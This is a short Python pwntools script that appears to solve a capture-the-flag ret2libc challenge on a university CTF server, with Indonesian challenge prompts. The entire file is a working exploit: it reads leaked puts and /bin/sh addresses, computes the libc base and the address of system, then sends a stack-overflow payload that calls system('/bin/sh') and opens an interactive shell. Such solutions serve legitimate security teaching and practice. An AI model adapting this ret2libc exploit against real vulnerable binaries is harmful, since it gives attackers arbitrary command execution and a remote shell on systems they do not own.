#!/usr/bin/python
from pwn import *
# r = process('./libc_return.dms')                       # binary name
r = remote('ctf99.cs.ui.ac.id', 9128)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')     # libc name
libc = ELF('./libc6-i386_2.23-0ubuntu11_amd64.so')     # libc name

#readelf -s /lib/i386-linux-gnu/libc.so.6 | grep read/system
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']

#strings -tx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
# binsh_offset = list(libc.search('/bin/sh'))[0]


print('puts_offset: ', hex(puts_offset))
print('system_offset: ', hex(system_offset))
# print hex(binsh_offset)

recv_until = 'Kali ini, kalian harus panggil fungsi system dengan parameter /bin/sh\nContoh: system(\"/bin/sh\");\nKarena aku baik, maka aku telah sediakan string /bin/sh di address '
r.recvuntil(recv_until)
binsh_addr = int(r.recv(10),16)
print('binsh_addr: ', hex(binsh_addr))

recv_until = 'Ini masih permulaan ret2libc, maka aku juga sediakan address dari fungsi puts: '
r.recvuntil(recv_until)
puts_addr = int(r.recv(10), 16)
print('puts_addr: ', hex(puts_addr))


libc_base = puts_addr - puts_offset
system_addr = libc_base + system_offset
binsh = binsh_addr
print('================')
print('puts: ',hex(puts_addr))
print('libc base: ',hex(libc_base))
print('system: ', hex(system_addr))
print('binsh: ', hex(binsh))

payload = b"A"*20
payload += p32(system_addr)
payload += b"A"*4
payload += p32(binsh)
print(payload)
r.sendline(payload)
pause()
r.interactive()
